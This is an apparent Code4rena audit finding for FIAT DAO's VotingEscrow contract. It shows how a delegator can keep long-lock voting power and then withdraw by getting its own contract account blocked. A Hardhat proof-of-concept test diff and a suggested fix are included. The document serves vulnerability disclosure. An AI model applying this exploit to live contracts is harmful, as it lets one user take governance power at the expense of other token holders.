## Tags

- bug
- 3 (High Risk)
- disagree with severity
- sponsor confirmed

# [Delegators can Avoid Lock Commitments if they can Reliably get Themselves Blocked when Needed](https://github.com/code-423n4/2022-08-fiatdao-findings/issues/204) 

# Lines of code

https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L526-L625


# Vulnerability details

## Impact
Users can enjoy the voting power of long lock times whilst not committing their tokens. This could cause the entire system to break down as the incentives don't work any more.

## Exploit Method
This exploit only works if a user is able to use the system and reliably get themselves blocked. Blocking policies are not in scope, so I am assuming there would be a list of bannable offences, and thus this condition could be fulfilled.
Consider a user with two accounts, called Rider and Horse.
Rider has 100,000 tokens.
Horse has 1 token.
Rider is a smart contract (required for an account to be bannable).
Rider locks for 1 week.
Horse locks for 52 weeks.
Rider delegates to Horse.
Horse can continue to extend its lock period and enjoy the maximised voting power.
Whenever the user wants their tokens back, they simply need to get the Rider account blocked.
When Rider is blocked, `Blocklist.block(RiderAddress)` is called, which in turn calls `ve.forceUndelegate(RiderAddress)`.
Rider is now an undelegated account with an expired lock. It can call `ve.withdraw()` to get its tokens back.
The user can repeat this process with a fresh account taking the role of Rider.

## Recommended Mitigation Steps
`forceUndelegate()` could be made to set `locked_.end = fromLocked.end`. This would mean that blocked users are still locked into the system for the period they delegated for. However, this does have the downside of tokens being locked in the system without the full rights of the system which other users enjoy.
Alternatively, this might be addressable through not blocking users that seem to be doing this, but of course that might have other undersirable consequences.

## Proof of Concept
```diff
diff --git a/test/votingEscrowTest.ts b/test/votingEscrowBlockMeTest.ts
index 7d3163d..ed27155 100644
--- a/test/votingEscrowTest.ts
+++ b/test/votingEscrowBlockMeTest.ts
@@ -25,7 +25,7 @@ describe("VotingEscrow Tests", function () {
   let fdtMock: MockERC20;
   let contract: MockSmartWallet;
   let contract2: MockSmartWallet; // ADD TEST FOR 0 BALANCES
-  let contract3: MockSmartWallet;
+  let rider: MockSmartWallet;
   let admin: SignerWithAddress;
   let treasury: SignerWithAddress;
   const maxPenalty = utils.parseEther("1");
@@ -36,6 +36,7 @@ describe("VotingEscrow Tests", function () {
   let charlie: SignerWithAddress;
   let david: SignerWithAddress;
   let eve: SignerWithAddress;
+  let horse: SignerWithAddress;
   const initialFDTuserBal = utils.parseEther("1000");
   const lockAmount = utils.parseEther("100");
   let tx;
@@ -57,7 +58,7 @@ describe("VotingEscrow Tests", function () {
     await createSnapshot(provider);
 
     signers = await ethers.getSigners();
-    [admin, alice, bob, charlie, david, eve, treasury] = signers;
+    [admin, alice, bob, charlie, david, eve, treasury, horse] = signers;
 
     // Deploy FDT contract
     const fdtMockDeployer = await ethers.getContractFactory("MockERC20", admin);
@@ -69,6 +70,7 @@ describe("VotingEscrow Tests", function () {
     await fdtMock.mint(charlie.address, initialFDTuserBal);
     await fdtMock.mint(david.address, initialFDTuserBal);
     await fdtMock.mint(eve.address, initialFDTuserBal);
+    await fdtMock.mint(horse.address, initialFDTuserBal);
 
     // Deploy VE contract
     const veDeployer = await ethers.getContractFactory("VotingEscrow", admin);
@@ -96,6 +98,7 @@ describe("VotingEscrow Tests", function () {
     await fdtMock.setAllowance(charlie.address, ve.address, MAX);
     await fdtMock.setAllowance(david.address, ve.address, MAX);
     await fdtMock.setAllowance(eve.address, ve.address, MAX);
+    await fdtMock.setAllowance(horse.address, ve.address, MAX);
 
     // Deploy malicious contracts
     const contractDeployer = await ethers.getContractFactory(
@@ -108,8 +111,8 @@ describe("VotingEscrow Tests", function () {
     contract2 = await contractDeployer.deploy(fdtMock.address);
     await fdtMock.mint(contract2.address, initialFDTuserBal);
 
-    contract3 = await contractDeployer.deploy(fdtMock.address);
-    await fdtMock.mint(contract3.address, initialFDTuserBal);
+    rider = await contractDeployer.deploy(fdtMock.address);
+    await fdtMock.mint(rider.address, initialFDTuserBal);
   });
   after(async () => {
     await restoreSnapshot(provider);
@@ -139,722 +142,54 @@ describe("VotingEscrow Tests", function () {
     });
   });
 
-  describe("Blocklist checker", async () => {
-    it("Blocklist EOA fails", async () => {
+  describe("C4 POCs", async () => {
+    it("Rider locks many tokens for a week.", async () => {
       await createSnapshot(provider);
+      const smallLockTime = 1 * WEEK + (await getTimestamp());
 
-      expect(await blocklist.isBlocked(alice.address)).to.equal(false);
-      expect(await blocklist.isBlocked(bob.address)).to.equal(false);
-
-      tx = blocklist.block(alice.address);
-      await expect(tx).to.be.revertedWith("Only contracts");
-    });
-
-    it("Blocklist contract succeeds", async () => {
-      const lockTime = 4 * WEEK + (await getTimestamp());
-
-      expect(await blocklist.isBlocked(contract.address)).to.equal(false);
-      await contract.createLock(ve.address, lockAmount, lockTime);
-
-      await blocklist.block(contract2.address);
-      expect(await blocklist.isBlocked(contract2.address)).to.equal(true);
-    });
-
-    it("Only owner can blocklist", async () => {
-      tx = blocklist.connect(bob).block(contract.address);
-      await expect(tx).to.be.revertedWith("Only manager");
-
-      await restoreSnapshot(provider);
-    });
-  });
-
-  describe("EOA flow", async () => {
-    it("Alice and Bob lock FDT in ve", async () => {
-      await createSnapshot(provider);
-      const lockTime = 4 * WEEK + (await getTimestamp());
-
-      await ve.connect(alice).createLock(lockAmount, lockTime);
-
-      await ve.connect(bob).createLock(lockAmount, lockTime);
-    });
-
-    it("Alice and Bob attempt to withdraw before lock end, fail", async () => {
-      tx = ve.connect(alice).withdraw();
-      await expect(tx).to.be.revertedWith("Lock not expired");
-
-      tx = ve.connect(bob).withdraw();
-      await expect(tx).to.be.revertedWith("Lock not expired");
-    });
-
-    it("Alice attempts to quit lock, succeeds with penalty", async () => {
-      // Increase time to 2 weeks to lock end
-      await increaseTimeTo((await ve.lockEnd(alice.address)).sub(WEEK * 2));
-      await ve.connect(alice).quitLock();
-
-      // Penalty is ~ 3.84% (2/52*100)
-      assertBNClosePercent(
-        await fdtMock.balanceOf(alice.address),
-        initialFDTuserBal.sub(lockAmount.mul(2).div(MAXTIME)),
-        "0.4"
-      );
-    });
-
-    it("Check accumulated penalty and collect", async () => {
-      const lockAmount = utils.parseEther("100");
-      expect(await ve.penaltyAccumulated()).gt(0);
-
-      const penaltyAccumulated = await ve.penaltyAccumulated();
-
-      await ve.collectPenalty();
-
-      expect(await ve.penaltyAccumulated()).to.equal(0);
-
-      expect(await fdtMock.balanceOf(treasury.address)).to.equal(
-        penaltyAccumulated
-      );
-    });
-
-    it("Bob increase his unlock time", async () => {
-      const lockTime = 10 * WEEK + (await getTimestamp());
-      await ve.connect(bob).increaseUnlockTime(lockTime);
-    });
-
-    it("Alice locks again after locked expired, succeed", async () => {
-      await increaseTime(5 * WEEK);
-      const lockTime = 4 * WEEK + (await getTimestamp());
-      await ve.connect(alice).createLock(lockAmount, lockTime);
-    });
-
-    it("Admin unlocks ve contracts", async () => {
-      tx = ve.connect(alice).withdraw();
-      await expect(tx).to.be.revertedWith("Lock not expired");
-
-      await ve.unlock();
-
-      expect(await ve.maxPenalty()).to.equal(0);
-    });
-
-    it("Alice and Bob attempt to quit lock, succeeds without penalty", async () => {
-      await ve.connect(alice).quitLock();
-      assertBNClosePercent(
-        await fdtMock.balanceOf(alice.address),
-        initialFDTuserBal.sub(lockAmount.mul(2).div(MAXTIME)),
-        "0.4"
-      );
-
-      await ve.connect(bob).quitLock();
-      expect(await fdtMock.balanceOf(bob.address)).to.equal(initialFDTuserBal); // because bob did not quit lock previously but deposited twice
-
-      expect(await ve.penaltyAccumulated()).to.equal(0);
-
-      await restoreSnapshot(provider);
-    });
-  });
-
-  describe("Malicious contracts flow", async () => {
-    it("2 contracts lock FDT in ve", async () => {
-      await createSnapshot(provider);
-
-      const lockTime = 4 * WEEK + (await getTimestamp());
-
-      // contract 1
-      await contract.createLock(ve.address, lockAmount, lockTime);
-      expect(await ve.balanceOf(contract.address)).not.eq(0);
-      expect(await ve.balanceOfAt(contract.address, await getBlock())).not.eq(
-        0
-      );
-
-      // contract 2
-      await contract2.createLock(ve.address, lockAmount, lockTime);
-      expect(await ve.balanceOf(contract2.address)).not.eq(0);
-      expect(await ve.balanceOfAt(contract2.address, await getBlock())).not.eq(
-        0
-      );
-    });
-
-    it("Blocklisted contract CANNOT increase amount of tokens", async () => {
-      // = await Deployer.deploy(ve.address);
-      await blocklist.block(contract.address);
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-
-      await expect(
-        contract.increaseAmount(ve.address, lockAmount)
-      ).to.be.revertedWith("Blocked contract");
-
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-    });
-
-    it("Blocklisted contract CANNOT increase locked time", async () => {
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-
-      await expect(
-        contract.increaseUnlockTime(
-          ve.address,
-          (await getTimestamp()) + 10 * WEEK
-        )
-      ).to.be.revertedWith("Blocked contract");
-
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-    });
-
-    it("Blocklisted contract can quit lock", async () => {
-      await increaseTime(ONE_WEEK);
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-
-      await contract.quitLock(ve.address);
-
-      assertBNClosePercent(
-        await fdtMock.balanceOf(contract.address),
-        initialFDTuserBal.sub(lockAmount.mul(2 * WEEK).div(MAXTIME)),
-        "0.5"
-      );
-      // expect(await fdtMock.balanceOf(contract.address)).to.equal(
-      //   initialFDTuserBal.sub(lockAmount.div(2))
-      // );
-    });
-
-    it("Admin unlocks ve contracts", async () => {
-      await ve.unlock();
-
-      expect(await ve.maxPenalty()).to.equal(0);
-    });
-
-    it("Allowed contract can quit lock without penalty", async () => {
-      // not blocklisted contract
-      await contract2.quitLock(ve.address);
-      expect(await fdtMock.balanceOf(contract2.address)).to.equal(
-        initialFDTuserBal
-      );
-
-      await restoreSnapshot(provider);
-    });
-  });
-
-  describe("Blocked contracts undelegation", async () => {
-    it("2contracts lock FDT in ve", async () => {
-      await createSnapshot(provider);
-
-      const lockTime = 4 * WEEK + (await getTimestamp());
-      const lockTime2 = 2 * WEEK + (await getTimestamp());
-      // contract 1
-      await contract.createLock(ve.address, lockAmount, lockTime);
-      expect(await ve.balanceOf(contract.address)).not.eq(0);
-      expect(await ve.balanceOfAt(contract.address, await getBlock())).not.eq(
-        0
-      );
-
-      // contract 2
-      await contract2.createLock(ve.address, lockAmount, lockTime);
-      expect(await ve.balanceOf(contract2.address)).not.eq(0);
-      expect(await ve.balanceOfAt(contract2.address, await getBlock())).not.eq(
-        0
-      );
-      // contract 3
-      await contract3.createLock(ve.address, lockAmount, lockTime);
-      expect(await ve.balanceOf(contract3.address)).not.eq(0);
-      expect(await ve.balanceOfAt(contract3.address, await getBlock())).not.eq(
-        0
-      );
-    });
-
-    it("Admin blocklists malicious contracts", async () => {
-      // contract 2 delegates first
-      await contract2.delegate(ve.address, contract.address);
-      await blocklist.block(contract2.address);
+      await rider.createLock(ve.address, initialFDTuserBal, smallLockTime);
     });
+    it("Horse locks a billionth of a token for max time.", async () => {
+      const bigLockTime = 52 * WEEK + (await getTimestamp());
 
-    it("Blocked contract gets UNDELEGATED", async () => {
-      await contract.delegate(ve.address, contract3.address);
-      expect((await ve.locked(contract.address)).delegatee).to.equal(
-        contract3.address
-      );
-      await blocklist.block(contract.address);
-      expect((await ve.locked(contract.address)).delegatee).to.equal(
-        contract.address
-      );
-    });
-
-    it("CANNOT delegate to a blocked Contract", async () => {
-      // contract 3  cannot delegate to contract
-      await expect(
-        contract3.delegate(ve.address, contract.address)
-      ).to.be.revertedWith("Blocked contract");
-      await blocklist.block(contract2.address);
-    });
-
-    it("Blocked contract CANNOT delegate to another user", async () => {
-      //contract 3 is not blocked
-      expect(await blocklist.isBlocked(contract3.address)).to.equal(false);
-      // contract 1 is blocked
-      await expect(
-        contract.delegate(ve.address, contract3.address)
-      ).to.be.revertedWith("Blocked contract");
-    });
-
-    it("Blocked contract is already undelegated", async () => {
-      expect((await ve.locked(contract.address)).delegatee).to.equal(
-        contract.address
-      );
-      // contract 1 is blocked
-      await expect(
-        contract.delegate(ve.address, contract.address)
-      ).to.be.revertedWith("Blocked contract");
-    });
-
-    it("Blocklisted contract CANNOT increase amount of tokens", async () => {
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-
-      await expect(
-        contract.increaseAmount(ve.address, lockAmount)
-      ).to.be.revertedWith("Blocked contract");
-
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
+      await ve.connect(horse).createLock(1_000_000_000, bigLockTime);
     });
-
-    it("Blocklisted contract CANNOT increase locked time", async () => {
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-
-      await expect(
-        contract.increaseUnlockTime(
-          ve.address,
-          (await getTimestamp()) + 10 * WEEK
-        )
-      ).to.be.revertedWith("Blocked contract");
-
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-    });
-
-    it("Blocklisted contract can quit lock", async () => {
-      await increaseTime(ONE_WEEK);
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-
-      await contract.quitLock(ve.address);
-
-      assertBNClosePercent(
-        await fdtMock.balanceOf(contract.address),
-        initialFDTuserBal.sub(lockAmount.mul(2 * WEEK).div(MAXTIME)),
-        "0.5"
-      );
-    });
-    it("Blocked contracts can withdraw", async () => {
-      await increaseTime(ONE_WEEK.mul(10));
-      // blocked contract can still
-      await contract2.withdraw(ve.address);
-
-      await restoreSnapshot(provider);
-    });
-  });
-
-  describe("Delegation flow", async () => {
-    it("Alice creates a lock", async () => {
-      await createSnapshot(provider);
-
-      const lockTime = 4 * WEEK + (await getTimestamp());
-
-      await ve.connect(alice).createLock(lockAmount, lockTime);
-
-      const block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.above(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-    });
-
-    it("Bob creates a lock, Alice delegates to Bob", async () => {
-      const lockTime = 5 * WEEK + (await getTimestamp());
-
-      // pre lock balances
-      let block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.above(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-
-      // bob creates lock
-      await ve.connect(bob).createLock(lockAmount, lockTime);
-
-      block = await getBlock();
-      const preBalance = await ve.balanceOfAt(bob.address, block);
-      expect(preBalance).to.above(0);
-
-      // alice delegates
-      await ve.connect(alice).delegate(bob.address);
-
-      // post lock balances
-      block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.above(preBalance);
-    });
-
-    it("Bob extends his lock beyond Alice's lock, succeeds", async () => {
-      const lockTime = 6 * WEEK + (await getTimestamp());
-
+    it("Rider delegates to Horse, increasing its voting power", async () => {
       // pre delegation balances
       let block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0);
-      const preBalance = await ve.balanceOfAt(bob.address, block);
+      const preBalance = await ve.balanceOfAt(horse.address, block);
       expect(preBalance).to.above(0);
 
-      // Bob extends lock
-      await ve.connect(bob).increaseUnlockTime(lockTime);
-      block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.above(preBalance);
-    });
-
-    it("Contract creates a lock, Bob delegates to contract", async () => {
-      const lockTime = 7 * WEEK + (await getTimestamp());
-
-      // create lock
-      await contract.createLock(ve.address, lockAmount, lockTime);
-      let block = await getBlock();
-      expect(await ve.balanceOfAt(contract.address, block)).to.above(0);
-
-      // delegate to contract
-      await ve.connect(bob).delegate(contract.address);
-      block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.above(0);
-      expect(await ve.balanceOfAt(contract.address, block)).to.above(0);
-    });
-
-    it("Alice re-delegates to contract", async () => {
-      let block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.above(0);
-
-      // re-delegation to contract
-      await ve.connect(alice).delegate(contract.address);
-      block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(contract.address, block)).to.above(0);
-    });
-
-    it("Alice's lock ends before Contract's, Alice cannot delegate back to herself", async () => {
-      tx = ve.connect(alice).delegate(alice.address);
-      await expect(tx).to.be.revertedWith("Only delegate to longer lock");
-
-      const block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(contract.address, block)).to.above(0);
-    });
-
-    it("Alice extends her lock", async () => {
-      const lockTime = 8 * WEEK + (await getTimestamp());
-      await ve.connect(alice).increaseUnlockTime(lockTime);
-
-      const block = await getBlock();
-      // expect(await ve.lockEnd(alice.address)).to.equal(
-      //   Math.trunc(lockTime / WEEK) * WEEK
-      // );
-    });
-
-    it("Alice's lock ends after Contract's, Alice can delegate back to herself", async () => {
-      // pre undelegation
-      let block = await getBlock();
-      const balance_before_contract = await ve.balanceOfAt(
-        contract.address,
-        block
-      );
-      expect(balance_before_contract).to.above(0);
-
-      // undelegate
-      await ve.connect(alice).delegate(alice.address);
-
-      // post undelegation
-      block = await getBlock();
-      expect(await ve.balanceOfAt(alice.address, block)).to.above(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(contract.address, block)).to.above(0);
-    });
-
-    it("Alice's lock is not delegated, Alice can quit", async () => {
-      // pre quit
-      let block = await getBlock();
-      expect(await fdtMock.balanceOf(alice.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-      expect(await ve.balanceOfAt(alice.address, block)).to.above(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(contract.address, block)).to.above(0);
-
-      // alice quits
-      await ve.connect(alice).quitLock();
-
-      // post quit
-      block = await getBlock();
-
-      assertBNClosePercent(
-        await fdtMock.balanceOf(alice.address),
-        initialFDTuserBal.sub(lockAmount.mul(7 * WEEK).div(MAXTIME)),
-        "0.5"
-      );
-      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(contract.address, block)).to.above(0);
-    });
-
-    it("Bob's lock is delegated, Bob cannot quit", async () => {
-      // pre quit
-      let block = await getBlock();
-      expect(await fdtMock.balanceOf(bob.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-
-      // Bob attempts to quit
-      tx = ve.connect(bob).quitLock();
-      await expect(tx).to.be.revertedWith("Lock delegated");
+      // rider delegates
+      await rider.delegate(ve.address, horse.address);
 
-      // post quit
-      block = await getBlock();
-      expect(await fdtMock.balanceOf(bob.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-    });
-
-    it("Bob extends lock and undelegates", async () => {
-      // pre undelegation
-      let block = await getBlock();
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-      const preBalance = await ve.balanceOfAt(contract.address, block);
-      expect(preBalance).to.above(0);
-
-      // Bob extends and undelegates
-      await ve
-        .connect(bob)
-        .increaseUnlockTime(7 * WEEK + (await getTimestamp()));
-      await ve.connect(bob).delegate(bob.address);
-
-      // post undelegation
-      block = await getBlock();
-      expect(await ve.balanceOfAt(bob.address, block)).to.above(0);
-      const postBalance = await ve.balanceOfAt(contract.address, block);
-      expect(postBalance).to.above(0);
-      expect(postBalance).to.below(preBalance);
-    });
-
-    it("Bob's lock is not delegated, Bob can quit", async () => {
-      // pre quit
-      let block = await getBlock();
-      expect(await fdtMock.balanceOf(bob.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-      expect(await ve.balanceOfAt(bob.address, block)).to.above(0);
-
-      // alice quits
-      await ve.connect(bob).quitLock();
-
-      // post quit
+      // post lock balances
       block = await getBlock();
-      assertBNClosePercent(
-        await fdtMock.balanceOf(bob.address),
-        initialFDTuserBal.sub(lockAmount.mul(6 * WEEK).div(MAXTIME)),
-        "0.5"
-      );
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
+      expect(await ve.balanceOfAt(rider.address, block)).to.equal(0);
+      expect(await ve.balanceOfAt(horse.address, block)).to.above(preBalance);
     });
+    it("After some time, Rider gets itself blocked.", async () => {
+      await increaseTime(15 * WEEK);
 
-    it("Contract extends lock beyond Bob's lock, ", async () => {
-      const lockTimeContract = 30 * WEEK + (await getTimestamp());
-      await contract.increaseUnlockTime(ve.address, lockTimeContract);
-
-      await increaseTime(8 * WEEK);
-      // pre delegation
-      const block = await getBlock();
-      assertBNClosePercent(
-        await fdtMock.balanceOf(bob.address),
-        initialFDTuserBal.sub(lockAmount.mul(7 * WEEK).div(MAXTIME)),
-        "0.5"
-      );
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
+      expect(await blocklist.isBlocked(rider.address)).to.equal(false);
+      await blocklist.block(rider.address);
+      expect(await blocklist.isBlocked(rider.address)).to.equal(true);
     });
-
-    it("Bob attempts to lock again, succeeds, Bob can delegate to contract", async () => {
-      const lockTime = 10 * WEEK + (await getTimestamp());
-      // bob creates a new lock
-      await ve.connect(bob).createLock(lockAmount, lockTime);
-
+    it("Rider can now withdraw", async () => {
       let block = await getBlock();
-      const preBalance = await ve.balanceOfAt(contract.address, block);
+      const preBalance = await ve.balanceOfAt(horse.address, block);
       expect(preBalance).to.above(0);
 
-      await ve.connect(bob).delegate(contract.address);
+      expect(await fdtMock.balanceOf(rider.address)).to.equal(0);
 
-      // post delegation
-      block = await getBlock();
-      assertBNClosePercent(
-        await fdtMock.balanceOf(bob.address),
-        initialFDTuserBal
-          .sub(lockAmount.mul(7 * WEEK).div(MAXTIME))
-          .sub(lockAmount),
-        "0.5"
-      );
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-      const postBalance = await ve.balanceOfAt(contract.address, block);
-      expect(postBalance).to.above(preBalance);
-      // const block = await getBlock();
-      // expect(await ve.lockEnd(contract.address)).to.equal(
-      //   Math.trunc(lockTime / WEEK) * WEEK
-      // );
-    });
+      await rider.withdraw(ve.address);
 
-    it("Contract's lock is not delegated, contract can quit and but lose delegated balance", async () => {
-      // pre quit
-      let block = await getBlock();
-      expect(await fdtMock.balanceOf(contract.address)).to.equal(
-        initialFDTuserBal.sub(lockAmount)
-      );
-      const preBalance = await ve.balanceOfAt(contract.address, block);
-      expect(preBalance).to.above(0);
-
-      // contract quits
-      await contract.quitLock(ve.address);
-
-      // post quit
       block = await getBlock();
+      expect(await ve.balanceOfAt(rider.address, block)).to.equal(0);
 
-      // Contract locked for 30 weeks, then we advanced 8 weeks
-      assertBNClosePercent(
-        await fdtMock.balanceOf(contract.address),
-        initialFDTuserBal.sub(lockAmount.mul(21 * WEEK).div(MAXTIME)),
-        "0.5"
-      );
-      const postBalance = await ve.balanceOfAt(contract.address, block);
-      expect(postBalance).to.equal(0);
-      expect(postBalance).to.below(preBalance);
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-    });
-
-    it("Bob's lock ends before Contract's, Bob cannot delegate back to himself", async () => {
-      tx = ve.connect(bob).delegate(bob.address);
-      await expect(tx).to.be.revertedWith("Only delegate to longer lock");
-
-      const block = await getBlock();
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-      // Contract has no voting power
-      expect(await ve.balanceOfAt(contract.address, block)).to.equal(0);
-    });
-
-    it("Bob extends his lock", async () => {
-      const lockTime = 50 * WEEK + (await getTimestamp());
-      await ve.connect(bob).increaseUnlockTime(lockTime);
-
-      const block = await getBlock();
-      // expect(await ve.lockEnd(bob.address)).to.equal(
-      //   Math.trunc(lockTime / WEEK) * WEEK
-      // );
-    });
-
-    it("Bob's lock ends after Contract's, Bob can delegate back to himself", async () => {
-      // pre undelegation
-      let block = await getBlock();
-      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0);
-      expect(await ve.balanceOfAt(contract.address, block)).to.equal(0);
-
-      // undelegate
-      await ve.connect(bob).delegate(bob.address);
-
-      // post undelegation
-      block = await getBlock();
-      expect(await ve.balanceOfAt(bob.address, block)).to.above(0);
-      expect(await ve.balanceOfAt(contract.address, block)).to.equal(0);
-
-      await restoreSnapshot(provider);
-    });
-  });
-
-  describe("Quitlock flow", async () => {
-    it("Alice, Bob, Charlie, David and Eve lock FDT in ve", async () => {
-      await createSnapshot(provider);
-      // MAXTIME => 1 year
-      const lockTime1 = MAXTIME + (await getTimestamp());
-      const lockTime2 = MAXTIME / 2 + (await getTimestamp());
-
-      // 1 year lock
-      await ve.connect(alice).createLock(lockAmount, lockTime1);
-      await ve.connect(bob).createLock(lockAmount, lockTime1);
-      await ve.connect(charlie).createLock(lockAmount, lockTime1);
-
-      // 6 month lock
-      await ve.connect(david).createLock(lockAmount, lockTime2);
-      await ve.connect(eve).createLock(lockAmount, lockTime2);
-    });
-
-    it("Alice and David quitlocks after ~3 months", async () => {
-      await increaseTime(ONE_WEEK.mul(13));
-      await ve.connect(alice).quitLock();
-      // Alice would have ~39 weeks left
-      assertBNClosePercent(
-        await fdtMock.balanceOf(alice.address),
-        initialFDTuserBal.sub(lockAmount.mul(ONE_WEEK.mul(39)).div(MAXTIME)),
-        "0.5"
-      );
-      // David would have ~13 weeks left
-      await ve.connect(david).quitLock();
-      assertBNClosePercent(
-        await fdtMock.balanceOf(david.address),
-        initialFDTuserBal.sub(lockAmount.mul(ONE_WEEK.mul(13)).div(MAXTIME)),
-        "0.5"
-      );
-    });
-
-    it("Bob and Eve quitlocks after ~ 4 months", async () => {
-      await increaseTime(ONE_WEEK.mul(4));
-      await ve.connect(bob).quitLock();
-      // Bob would have ~35 weeks left
-      assertBNClosePercent(
-        await fdtMock.balanceOf(bob.address),
-        initialFDTuserBal.sub(lockAmount.mul(ONE_WEEK.mul(35)).div(MAXTIME)),
-        "0.5"
-      );
-      // David would have ~9 weeks left
-      await ve.connect(eve).quitLock();
-      assertBNClosePercent(
-        await fdtMock.balanceOf(eve.address),
-        initialFDTuserBal.sub(lockAmount.mul(ONE_WEEK.mul(9)).div(MAXTIME)),
-        "0.5"
-      );
-    });
-
-    it("Charlie quitlocks after ~ 9 months", async () => {
-      await increaseTime(ONE_WEEK.mul(21));
-      await ve.connect(charlie).quitLock();
-      // Charlie would have ~14 weeks left
-      assertBNClosePercent(
-        await fdtMock.balanceOf(charlie.address),
-        initialFDTuserBal.sub(lockAmount.mul(ONE_WEEK.mul(14)).div(MAXTIME)),
-        "0.5"
-      );
-    });
+      //Rider's tokens are back in the wallet
+      expect(await fdtMock.balanceOf(rider.address)).to.equal(initialFDTuserBal);
 
-    it("Alice locks again, then penalty is taken away,she withdraws without penalty", async () => {
-      const aliceBalBefore = await fdtMock.balanceOf(alice.address);
-      await ve
-        .connect(alice)
-        .createLock(lockAmount, (await getTimestamp()) + MAXTIME);
-      await ve.unlock();
-      await ve.connect(alice).quitLock();
-      expect(await fdtMock.balanceOf(alice.address)).to.equal(aliceBalBefore);
     });
   });
 });
```
